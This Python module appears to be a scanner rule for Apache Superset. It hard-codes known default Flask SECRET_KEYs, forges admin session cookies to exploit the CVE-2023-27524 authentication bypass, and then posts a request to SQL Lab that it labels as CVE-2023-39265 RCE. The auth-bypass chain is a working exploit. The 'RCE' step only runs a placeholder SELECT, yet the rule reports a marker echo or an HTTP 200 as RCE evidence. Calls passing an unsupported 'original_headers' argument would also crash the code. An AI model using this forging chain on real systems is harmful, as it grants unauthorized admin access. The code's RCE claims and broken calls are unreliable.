# Filename: VulnerabilityChecks/ApacheSupersetMultiCVEScanRule.py

import asyncio
import logging
import random
import string
import uuid
import urllib.parse
import json # For RCE payload if needed
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple, Set, TYPE_CHECKING

import aiohttp
# For Flask session cookie forging (if SECRET_KEY is known)
# You might need to install itsdangerous: pip install itsdangerous
from itsdangerous import URLSafeTimedSerializer, BadSignature, SignatureExpired

if TYPE_CHECKING:
    from asyncio import Queue # For type hinting

@dataclass
class SupersetMultiCVEAlert:
    cwe_id: int = 288
    wasc_id: int = 1
    name: str = "Apache Superset Vulnerability (CVE-2023-27524 Auth Bypass / CVE-2023-39265 RCE)"
    description: str = ""
    uri: str = ""
    attack_sequence: List[Dict[str, Any]] = field(default_factory=list)
    evidence: str = ""
    other_info: str = ""
    solution: str = (
        "Upgrade Apache Superset to version 2.0.1 or later to address CVE-2023-27524. "
        "Upgrade to version 2.1.1 or later to address CVE-2023-39265. "
        "Ensure a strong, unique Flask SECRET_KEY is configured. "
        "Restrict access to SQL Lab and other sensitive features if not needed by all users. "
        "Regularly review Superset security advisories."
    )
    reference: str = (
        "CVE-2023-27524 (Auth Bypass)\n"
        "CVE-2023-39265 (RCE)\n"
        "https://lists.apache.org/thread/n0l9r4illo892k9v12fg2ncl3s10s35t (CVE-2023-27524)\n"
        "https://lists.apache.org/thread/4p7k90q189rp0nwy2ytcyy8h6z9wz1t1 (CVE-2023-39265)"
    )
    risk: int = 4
    confidence: int = 2
    # Class level constants for confidence
    CONFIDENCE_HIGH: int = 3
    CONFIDENCE_MEDIUM: int = 2
    CONFIDENCE_LOW: int = 1

    cve_ids: List[str] = field(default_factory=list)
    oast_interaction_id: Optional[str] = None
    alert_tags: Dict[str, str] = field(default_factory=lambda: {
        "OWASP_2021_A07": "Identification and Authentication Failures",
        "OWASP_2021_A03": "Injection",
    })

    def as_dict(self) -> Dict[str, Any]:
        tags = self.alert_tags.copy()
        if self.oast_interaction_id:
            tags["OAST_Interaction"] = "Detected" # Or "Attempted"
        if self.cve_ids:
            tags["CVE"] = ", ".join(self.cve_ids)
        
        return {
            "vulnerability_type": "Superset_MultiCVE",
            "type": self.name,
            "detail": self.description,
            "payload_used": f"Attack Sequence: {len(self.attack_sequence)} steps. (Details in other_info/OAST)",
            "injection_point_info": "Varies: Session Forging, SQL Lab RCE",
            "url_tested": self.uri,
            "severity": {1: "Info", 2: "Low", 3: "Medium", 4: "High"}.get(self.risk, "Unknown"),
            "confidence": {1: "Low", 2: "Medium", 3: "High"}.get(self.confidence, "Unknown"),
            "evidence": self.evidence,
            "solution": self.solution,
            "reference": self.reference,
            "cwe_id": self.cwe_id,
            "wasc_id": self.wasc_id,
            "alert_tags": tags,
            "other_info": self.other_info,
            "attack_sequence_details": self.attack_sequence
        }

DEFAULT_SUPERSET_SECRET_KEYS = [
    b'\x02\x01thisismyscretkey\x01\x02\\e\\y\\y\\h',
    b'CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET',
    b'YOUR_OWN_RANDOM_GENERATED_SECRET_KEY',
    b'thisISaSECRET_1234',
    b'TEST_NON_DEV_SECRET',
    b'this is a secret key',
    b'a_truly_random_secret_key',
    b'this is a very secret key',
    b'1234567890',
    b'admin',
    b'secret',
]
FORGED_USER_ID = 1
SESSION_COOKIE_NAME = "session"
AUTH_CHECK_ENDPOINT = "/api/v1/database/"
SQL_LAB_EXECUTE_ENDPOINT = "/superset/sql_json/"
RCE_ECHO_MARKER = "SUPERSETRCETEST"

class ApacheSupersetMultiCVEScanRule:
    tech_required: Set[str] = {"Apache Superset"} # Specific to Superset
    def __init__(self,
                 parent_logger: Optional[logging.Logger] = None,
                 oast_base_url: Optional[str] = None,
                 http_timeout: float = 20.0,
                 secret_keys_to_try: Optional[List[bytes]] = None,
                 active_scan_async_q: Optional['Queue'] = None # Added parameter
                 ):
        self.logger = parent_logger or logging.getLogger(__name__)
        self.oast_base_url = self._normalize_oast_url(oast_base_url) if oast_base_url else None
        self.http_timeout = http_timeout
        self.secret_keys = secret_keys_to_try or DEFAULT_SUPERSET_SECRET_KEYS
        self.active_scan_async_q = active_scan_async_q # Store the queue
        
        if not self.oast_base_url:
            self.logger.info("Superset Scan: OAST base URL not configured. RCE confirmation will rely on echo/errors.")

    def _normalize_oast_url(self, url: str) -> str:
        parsed = urllib.parse.urlparse(url)
        return parsed.netloc if parsed.netloc else parsed.path.split('/')[0]

    def _forge_session_cookie(self, secret_key: bytes, user_id: int) -> Optional[str]:
        try:
            session_data = {'user_id': user_id, '_user_id': str(user_id)}
            serializer = URLSafeTimedSerializer(secret_key, salt='cookie-session')
            return serializer.dumps(session_data)
        except Exception as e:
            self.logger.debug(f"Superset Scan: Failed to forge session cookie with key '{str(secret_key)[:20]}...': {e}")
            return None

    async def _send_request_with_session(
        self,
        session_http: aiohttp.ClientSession,
        method: str, url: str,
        headers: Optional[Dict[str, str]] = None,
        data: Optional[Dict[str, str]] = None,
        json_payload: Optional[Dict[str, Any]] = None,
        custom_cookies: Optional[Dict[str,str]] = None,
        allow_redirects: bool = False
    ) -> Tuple[Optional[Any], str, Dict[str,str]]:
        
        current_headers = (headers or {}).copy()
        if "User-Agent" not in current_headers:
             current_headers["User-Agent"] = random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
            ])
        if data and method.upper() == "POST" and not any(h.lower() == "content-type" for h in current_headers.keys()):
            current_headers["Content-Type"] = "application/x-www-form-urlencoded"
        if json_payload and method.upper() == "POST" and not any(h.lower() == "content-type" for h in current_headers.keys()):
            current_headers["Content-Type"] = "application/json"

        self.logger.debug(f"Superset Scan: Sending {method} to {url}. Data: {str(data)[:100] if data else str(json_payload)[:100] if json_payload else 'None'}. Custom Cookies: {custom_cookies is not None}")
        
        text_content = ""
        response_cookies_dict = {}
        resp_object_attrs = None

        try:
            timeout = aiohttp.ClientTimeout(total=self.http_timeout)
            async with session_http.request(
                method.upper(), url, headers=current_headers, data=data, json=json_payload,
                cookies=custom_cookies,
                timeout=timeout, allow_redirects=allow_redirects, ssl=False # Superset often on internal/dev
            ) as resp:
                text_content = await resp.text(errors='replace')
                for cookie_name, cookie_obj in resp.cookies.items():
                    response_cookies_dict[cookie_name] = cookie_obj.value
                
                @dataclass
                class DetachedRespAttrs: status: int; headers: Dict; text: str
                resp_object_attrs = DetachedRespAttrs(status=resp.status, headers=dict(resp.headers), text=text_content)
        except Exception as e:
            self.logger.warning(f"Superset Scan: Request to {url} failed: {type(e).__name__} - {e}")
        
        return resp_object_attrs, text_content, response_cookies_dict

    def _get_rce_payload_sql_lab_oast(self, unique_id: str, db_id: int = 1) -> Dict[str, Any]:
        if not self.oast_base_url:
            return self._get_rce_payload_sql_lab_echo(db_id)

        oast_target = f"{unique_id}.{self.oast_base_url}"
        sql_payload = f"SELECT 'OAST_PING_TO_{oast_target.replace('.', '_dot_')}';" # Placeholder
        self.logger.info(f"Superset RCE: Using conceptual SQL OAST payload: {sql_payload}")

        return {
            "database_id": db_id, "sql": sql_payload, "runAsync": False,
            "select_as_cta": False, "tmp_table_name": "", "client_id": str(uuid.uuid4())[:8]
        }

    def _get_rce_payload_sql_lab_echo(self, db_id: int = 1) -> Dict[str, Any]:
        sql_payload = f"SELECT '{RCE_ECHO_MARKER}';"
        return {
            "database_id": db_id, "sql": sql_payload, "runAsync": False,
            "select_as_cta": False, "tmp_table_name": "", "client_id": str(uuid.uuid4())[:8]
        }

    async def _queue_alert(self, alert_instance: SupersetMultiCVEAlert):
        if self.active_scan_async_q:
            try:
                await self.active_scan_async_q.put({"type": "active_scan_alert", "alert": alert_instance.as_dict()})
            except Exception as e_queue:
                self.logger.error(f"Failed to put Superset Multi-CVE alert onto async queue: {e_queue}")
        else:
            self.logger.warning("active_scan_async_q not available in Superset Multi-CVE rule, cannot queue alert.")

    async def scan(
        self,
        base_app_url: str,
        aiohttp_session: aiohttp.ClientSession,
        # The following are part of a more generic signature but less used by this specific rule
        original_headers: Optional[Dict[str, str]] = None, 
        original_cookies: Optional[Dict[str, str]] = None,
        page_specific_technologies: Optional[List[str]] = None,
        injection_details: Optional[Dict[str, Any]] = None,
        original_page_content_for_baseline_errors: Optional[str] = None
    ) -> None: # Changed return type to None
        
        if not self.active_scan_async_q:
            self.logger.warning("Superset Multi-CVE scan skipped: active_scan_async_q not configured.")
            return

        attack_sequence_log: List[Dict[str, Any]] = []
        alerts_generated_count = 0

        if not base_app_url.endswith('/'):
            base_app_url += '/'
        
        self.logger.info(f"Starting Apache Superset Multi-CVE scan for: {base_app_url}")

        auth_bypass_successful = False
        forged_session_cookie_value = None
        used_secret_key = None
        auth_bypass_alert_instance: Optional[SupersetMultiCVEAlert] = None

        auth_check_url = urllib.parse.urljoin(base_app_url, AUTH_CHECK_ENDPOINT.lstrip('/'))

        for secret_key_bytes in self.secret_keys:
            self.logger.debug(f"Superset Auth Bypass: Trying SECRET_KEY: {str(secret_key_bytes)[:30]}...")
            forged_cookie = self._forge_session_cookie(secret_key_bytes, FORGED_USER_ID)
            if not forged_cookie:
                continue

            custom_cookies_for_req = {SESSION_COOKIE_NAME: forged_cookie}
            current_step_log_auth = {
                "step": "Auth Bypass Check (CVE-2023-27524)", "url": auth_check_url, "method": "GET",
                "secret_key_tried": str(secret_key_bytes)[:30]+"...", "forged_cookie_snippet": forged_cookie[:30]+"..."
            }
            
            resp_attrs, resp_text, _ = await self._send_request_with_session(
                aiohttp_session, "GET", auth_check_url, custom_cookies=custom_cookies_for_req,
                original_headers=original_headers # Pass original_headers for User-Agent etc.
            )
            current_step_log_auth["response_status"] = resp_attrs.status if resp_attrs else "Request Failed"
            attack_sequence_log.append(current_step_log_auth)

            if resp_attrs and resp_attrs.status == 200 and ('"count"' in resp_text or '"result": [' in resp_text):
                self.logger.info(f"Superset Auth Bypass (CVE-2023-27524) SUCCESSFUL with key: {str(secret_key_bytes)[:30]}...")
                auth_bypass_successful = True
                forged_session_cookie_value = forged_cookie
                used_secret_key = secret_key_bytes
                
                auth_bypass_alert_instance = SupersetMultiCVEAlert(
                    name="Apache Superset Authentication Bypass (CVE-2023-27524)",
                    description=f"Authentication bypass successful using a known/weak Flask SECRET_KEY to forge a session cookie for user ID {FORGED_USER_ID}.",
                    uri=base_app_url, attack_sequence=list(attack_sequence_log),
                    evidence=f"Successfully accessed {AUTH_CHECK_ENDPOINT} (HTTP 200) with forged session. SECRET_KEY used (or similar): {str(used_secret_key)[:30]}...",
                    other_info=f"Forged session for user_id: {FORGED_USER_ID}. SECRET_KEY (prefix): {str(used_secret_key)[:30]}...",
                    cve_ids=["CVE-2023-27524"],
                    confidence=SupersetMultiCVEAlert.CONFIDENCE_HIGH
                )
                # Don't queue yet, wait to see if RCE is possible
                break
        
        if auth_bypass_successful and forged_session_cookie_value and auth_bypass_alert_instance:
            self.logger.info("Superset RCE (CVE-2023-39265): Auth bypass successful, proceeding to RCE attempt via SQL Lab.")
            
            rce_target_url = urllib.parse.urljoin(base_app_url, SQL_LAB_EXECUTE_ENDPOINT.lstrip('/'))
            unique_oast_id = str(uuid.uuid4())
            db_id_to_try = 1 

            rce_payload_json = self._get_rce_payload_sql_lab_oast(unique_oast_id, db_id_to_try) \
                               if self.oast_base_url else self._get_rce_payload_sql_lab_echo(db_id_to_try)

            current_step_log_rce = {
                "step": "RCE Attempt (CVE-2023-39265)", "url": rce_target_url, "method": "POST",
                "payload_json": rce_payload_json, "forged_cookie_used": True
            }
            
            rce_custom_cookies = {SESSION_COOKIE_NAME: forged_session_cookie_value}
            resp_attrs_rce, rce_resp_text, _ = await self._send_request_with_session(
                aiohttp_session, "POST", rce_target_url, json_payload=rce_payload_json,
                custom_cookies=rce_custom_cookies, original_headers=original_headers
            )
            current_step_log_rce["response_status"] = resp_attrs_rce.status if resp_attrs_rce else "Request Failed"
            attack_sequence_log.append(current_step_log_rce) # Add RCE attempt to the same log

            rce_confirmed_evidence = None
            rce_confidence = SupersetMultiCVEAlert.CONFIDENCE_LOW

            if resp_attrs_rce and resp_attrs_rce.status is not None:
                if self.oast_base_url and "OAST_PING_TO_" in rce_payload_json["sql"]:
                    rce_confirmed_evidence = f"RCE OAST payload sent via SQL Lab. Check OAST server for ID: {unique_oast_id}. SQL: {rce_payload_json['sql']}"
                    rce_confidence = SupersetMultiCVEAlert.CONFIDENCE_MEDIUM
                    auth_bypass_alert_instance.oast_interaction_id = unique_oast_id
                    self.logger.info(f"Superset RCE: OAST payload sent. ID: {unique_oast_id}")
                
                if RCE_ECHO_MARKER in rce_payload_json["sql"] and RCE_ECHO_MARKER in rce_resp_text:
                    try:
                        rce_resp_json = json.loads(rce_resp_text)
                        if isinstance(rce_resp_json.get("data"), list) and \
                           any(RCE_ECHO_MARKER in row.get(RCE_ECHO_MARKER, "") for row in rce_resp_json["data"] if isinstance(row, dict)):
                            rce_confirmed_evidence = f"RCE echo marker '{RCE_ECHO_MARKER}' found in SQL Lab JSON response."
                            rce_confidence = SupersetMultiCVEAlert.CONFIDENCE_HIGH
                            self.logger.info("Superset RCE: Confirmed via echo marker in SQL Lab response.")
                    except json.JSONDecodeError:
                        self.logger.debug("Superset RCE: SQL Lab response was not valid JSON for echo check.")
                
                if not rce_confirmed_evidence and resp_attrs_rce.status == 200:
                    rce_confirmed_evidence = f"RCE attempt via SQL Lab returned HTTP 200, but no direct OAST/echo confirmation. Manual verification needed. Response snippet: {rce_resp_text[:200]}"
            
            if rce_confirmed_evidence:
                auth_bypass_alert_instance.name = "Apache Superset Auth Bypass (CVE-2023-27524) leading to RCE (CVE-2023-39265)"
                auth_bypass_alert_instance.description += f" Post-authentication, an RCE attempt via SQL Lab was made. RCE Confirmation: {rce_confirmed_evidence}"
                auth_bypass_alert_instance.cve_ids.append("CVE-2023-39265")
                auth_bypass_alert_instance.evidence += f" | RCE Evidence: {rce_confirmed_evidence}"
                auth_bypass_alert_instance.other_info += f" | RCE SQL: {rce_payload_json['sql']}. OAST ID (if used): {unique_oast_id if self.oast_base_url and auth_bypass_alert_instance.oast_interaction_id else 'N/A'}"
                auth_bypass_alert_instance.confidence = rce_confidence
                auth_bypass_alert_instance.attack_sequence = list(attack_sequence_log)
            
            await self._queue_alert(auth_bypass_alert_instance)
            alerts_generated_count += 1
            
        elif auth_bypass_alert_instance: # Auth bypass worked, but RCE stage not triggered (e.g. no OAST) or failed
            await self._queue_alert(auth_bypass_alert_instance) # Queue the auth bypass alert
            alerts_generated_count += 1
        
        else: # No auth bypass
            self.logger.info("Superset Scan: Auth bypass (CVE-2023-27524) failed or no vulnerable keys found. RCE (CVE-2023-39265) scan not attempted.")

        if alerts_generated_count > 0:
            self.logger.info(f"Apache Superset Multi-CVE scan for {base_app_url} completed. Found {alerts_generated_count} alerts.")
        else:
            self.logger.info(f"Apache Superset Multi-CVE scan for {base_app_url} completed. No alerts generated.")
        return